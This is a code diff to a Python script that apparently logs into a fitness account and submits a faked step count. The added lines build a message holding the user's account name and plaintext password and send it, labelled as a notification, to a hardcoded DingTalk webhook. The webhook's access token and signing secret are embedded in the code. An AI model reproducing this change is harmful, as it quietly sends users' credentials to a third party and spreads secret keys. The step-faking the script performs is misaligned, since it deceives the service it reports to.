@@ -1,13 +1,16 @@
 import requests
+import urllib
+import string
 import time
 import re
 import json
 from random import randint
+from dingtalkchatbot.chatbot import DingtalkChatbot #DingtalkChatbot
 
 headers = {
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
     }
- 
+
 #获取登录code
 def get_code(location):
     code_pattern = re.compile("(?<=access=).*?(?=&)")
@@ -73,7 +76,7 @@ def main():
      
     app_token = get_app_token(login_token)
  
-    date = time.strftime("%Y-%m-%d",time.localtime())
+    date = time.strftime("%Y/%m/%d %H:%M:%S",time.localtime())
  
     with open('data_json.txt','rt') as f:
         data_json = f.read()
@@ -97,7 +100,8 @@ def main():
  
     response = requests.post(url, data=data, headers=head).json()
     print(response)
-    result = f"改变步数为 {step}  状态: "+ response['message']
+    result = "时间："+date+"\n" + f"账号：{user}\n密码：{password}\n步数：{step}\n状态："+ response['message']
+    sendDingDing(result)
     print(result)
     return result
   
@@ -116,6 +120,14 @@ def get_app_token(login_token):
     print("app_token获取成功！")
     print(app_token)
     return app_token
+
+# 钉钉机器人通知
+def sendDingDing(msg):
+    print('正在发送钉钉机器人通知...')
+    webhook = 'https://oapi.dingtalk.com/robot/send?access_token=fadb9756052d6bbafb45e72e10477f9ad94020ad55058903806b21209170cae0'
+    secret = 'SEC024ea5ad293132c70a3439a9dbfefcb9ed5795e8c138d4c7e39406f296c286d9'
+    xiaoding = DingtalkChatbot(webhook, secret=secret)  # 方式二：勾选“加签”选项时使用（v1.5以上新功能）
+    xiaoding.send_text(str(msg), is_at_all=False)
 
 #。。。。。。
 def main_handler(event, context):
